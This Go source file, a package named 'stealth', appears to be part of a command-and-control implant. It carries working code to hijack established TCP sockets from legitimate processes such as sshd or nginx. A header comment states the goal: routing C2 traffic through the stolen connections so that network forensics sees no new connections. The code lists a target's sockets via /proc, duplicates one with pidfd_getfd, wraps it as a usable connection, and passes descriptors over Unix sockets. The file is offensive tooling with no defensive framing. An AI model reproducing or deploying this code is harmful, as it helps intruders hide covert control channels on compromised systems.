package stealth

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
)

// Socket Inheritance
//
// OPSEC rationale: Every new TCP connection appears in `ss`, `netstat`,
// and /proc/net/tcp. If our C2 traffic creates new connections, network
// forensics easily spots them. Instead, we can hijack an existing socket
// from a legitimate process (via SCM_RIGHTS fd passing over Unix sockets,
// or by reading /proc/[pid]/fd/ entries). Our C2 traffic flows through
// an already-established sshd or nginx connection — zero new connections.

// SocketInfo represents a discovered socket from a target process.
type SocketInfo struct {
	FD         int
	Type       string // "tcp", "tcp6", "udp", "unix"
	LocalAddr  string
	RemoteAddr string
	State      string
	Inode      uint64
}

// FindProcessSockets discovers all sockets owned by a target process.
func FindProcessSockets(pid int) ([]SocketInfo, error) {
	var sockets []SocketInfo

	fdDir := fmt.Sprintf("/proc/%d/fd", pid)
	entries, err := os.ReadDir(fdDir)
	if err != nil {
		return nil, fmt.Errorf("read fd dir: %w", err)
	}

	for _, entry := range entries {
		link, err := os.Readlink(fmt.Sprintf("%s/%s", fdDir, entry.Name()))
		if err != nil {
			continue
		}

		// Socket links look like "socket:[12345]"
		if !strings.HasPrefix(link, "socket:[") {
			continue
		}

		inode := parseSocketInode(link)
		fdNum, _ := strconv.Atoi(entry.Name())

		info := SocketInfo{
			FD:    fdNum,
			Inode: inode,
		}

		// Resolve socket details from /proc/net/*
		resolveSocketInfo(inode, &info)
		sockets = append(sockets, info)
	}

	return sockets, nil
}

// FindEstablishedConnection finds an ESTABLISHED TCP connection from a target process
// to a specific remote address. This is the socket we want to hijack for C2.
func FindEstablishedConnection(pid int, remoteAddr string) (*SocketInfo, error) {
	sockets, err := FindProcessSockets(pid)
	if err != nil {
		return nil, err
	}

	for _, s := range sockets {
		if s.State == "ESTABLISHED" && (remoteAddr == "" || s.RemoteAddr == remoteAddr) {
			return &s, nil
		}
	}

	return nil, fmt.Errorf("no established connection found")
}

// DuplicateSocket duplicates a file descriptor from another process into ours
// using pidfd_getfd (Linux 5.6+). This gives us a copy of their socket.
func DuplicateSocket(targetPID int, targetFD int) (int, error) {
	// Open a pidfd for the target process
	pidfd, _, errno := syscall.RawSyscall(
		434, // SYS_PIDFD_OPEN
		uintptr(targetPID),
		0,
		0,
	)
	if errno != 0 {
		return -1, fmt.Errorf("pidfd_open: %v", errno)
	}
	defer syscall.Close(int(pidfd))

	// Use pidfd_getfd to duplicate their fd into our process
	newFD, _, errno := syscall.RawSyscall(
		438, // SYS_PIDFD_GETFD
		pidfd,
		uintptr(targetFD),
		0,
	)
	if errno != 0 {
		return -1, fmt.Errorf("pidfd_getfd: %v", errno)
	}

	return int(newFD), nil
}

// SocketToConn wraps a raw socket fd into a net.Conn for use with Go's net package.
func SocketToConn(fd int) (net.Conn, error) {
	// Create a *os.File from the fd
	f := os.NewFile(uintptr(fd), "inherited-socket")
	if f == nil {
		return nil, fmt.Errorf("invalid fd %d", fd)
	}

	// Convert to net.Conn
	conn, err := net.FileConn(f)
	f.Close() // FileConn dups the fd, so close our copy
	if err != nil {
		return nil, fmt.Errorf("file to conn: %w", err)
	}

	return conn, nil
}

// HijackSocket is the all-in-one function: find a target process's socket,
// duplicate it into our process, and return a usable net.Conn.
func HijackSocket(targetPID int, targetFD int) (net.Conn, error) {
	fd, err := DuplicateSocket(targetPID, targetFD)
	if err != nil {
		return nil, err
	}

	return SocketToConn(fd)
}

// SendFDOverUnix sends a file descriptor to another process over a Unix socket.
// Uses SCM_RIGHTS ancillary data. The receiving process gets a copy of the fd.
func SendFDOverUnix(unixConn *net.UnixConn, fd int) error {
	rawConn, err := unixConn.SyscallConn()
	if err != nil {
		return err
	}

	var sendErr error
	err = rawConn.Control(func(sockFD uintptr) {
		rights := syscall.UnixRights(fd)
		sendErr = syscall.Sendmsg(int(sockFD), []byte{0}, rights, nil, 0)
	})
	if err != nil {
		return err
	}
	return sendErr
}

// ReceiveFDOverUnix receives a file descriptor from another process over a Unix socket.
func ReceiveFDOverUnix(unixConn *net.UnixConn) (int, error) {
	rawConn, err := unixConn.SyscallConn()
	if err != nil {
		return -1, err
	}

	var recvFD int
	var recvErr error
	err = rawConn.Control(func(sockFD uintptr) {
		buf := make([]byte, 1)
		oob := make([]byte, syscall.CmsgLen(4))
		_, oobn, _, _, err := syscall.Recvmsg(int(sockFD), buf, oob, 0)
		if err != nil {
			recvErr = err
			return
		}

		msgs, err := syscall.ParseSocketControlMessage(oob[:oobn])
		if err != nil {
			recvErr = err
			return
		}

		for _, msg := range msgs {
			fds, err := syscall.ParseUnixRights(&msg)
			if err == nil && len(fds) > 0 {
				recvFD = fds[0]
				return
			}
		}
		recvErr = fmt.Errorf("no fd received")
	})
	if err != nil {
		return -1, err
	}
	return recvFD, recvErr
}

// parseSocketInode extracts the inode from "socket:[12345]" format.
func parseSocketInode(link string) uint64 {
	// "socket:[12345]" → 12345
	start := strings.Index(link, "[")
	end := strings.Index(link, "]")
	if start < 0 || end < 0 || end <= start {
		return 0
	}
	inode, _ := strconv.ParseUint(link[start+1:end], 10, 64)
	return inode
}

// resolveSocketInfo looks up socket details from /proc/net/*.
func resolveSocketInfo(inode uint64, info *SocketInfo) {
	// Check TCP first
	if resolveFromProcNet("/proc/net/tcp", inode, info) {
		info.Type = "tcp"
		return
	}
	if resolveFromProcNet("/proc/net/tcp6", inode, info) {
		info.Type = "tcp6"
		return
	}
	if resolveFromProcNet("/proc/net/udp", inode, info) {
		info.Type = "udp"
		return
	}
	info.Type = "unknown"
}

// resolveFromProcNet parses a /proc/net/* file to find socket details by inode.
func resolveFromProcNet(path string, inode uint64, info *SocketInfo) bool {
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}

	lines := strings.Split(string(data), "\n")
	for i, line := range lines {
		if i == 0 { // skip header
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 10 {
			continue
		}

		lineInode, _ := strconv.ParseUint(fields[9], 10, 64)
		if lineInode == inode {
			info.LocalAddr = decodeHexAddr(fields[1])
			info.RemoteAddr = decodeHexAddr(fields[2])
			info.State = decodeTCPState(fields[3])
			return true
		}
	}

	return false
}

// decodeHexAddr converts hex address:port from /proc/net/tcp to readable format.
func decodeHexAddr(hexAddr string) string {
	parts := strings.SplitN(hexAddr, ":", 2)
	if len(parts) != 2 {
		return hexAddr
	}

	// IP is in little-endian hex
	ipHex := parts[0]
	portHex := parts[1]

	if len(ipHex) == 8 {
		// IPv4
		ip := make([]byte, 4)
		for i := 0; i < 4; i++ {
			val, _ := strconv.ParseUint(ipHex[i*2:i*2+2], 16, 8)
			ip[3-i] = byte(val)
		}
		port, _ := strconv.ParseUint(portHex, 16, 16)
		return fmt.Sprintf("%d.%d.%d.%d:%d", ip[0], ip[1], ip[2], ip[3], port)
	}

	return hexAddr
}

// decodeTCPState converts hex TCP state to name.
func decodeTCPState(hex string) string {
	states := map[string]string{
		"01": "ESTABLISHED",
		"02": "SYN_SENT",
		"03": "SYN_RECV",
		"04": "FIN_WAIT1",
		"05": "FIN_WAIT2",
		"06": "TIME_WAIT",
		"07": "CLOSE",
		"08": "CLOSE_WAIT",
		"09": "LAST_ACK",
		"0A": "LISTEN",
		"0B": "CLOSING",
	}

	if name, ok := states[strings.ToUpper(hex)]; ok {
		return name
	}
	return hex
}
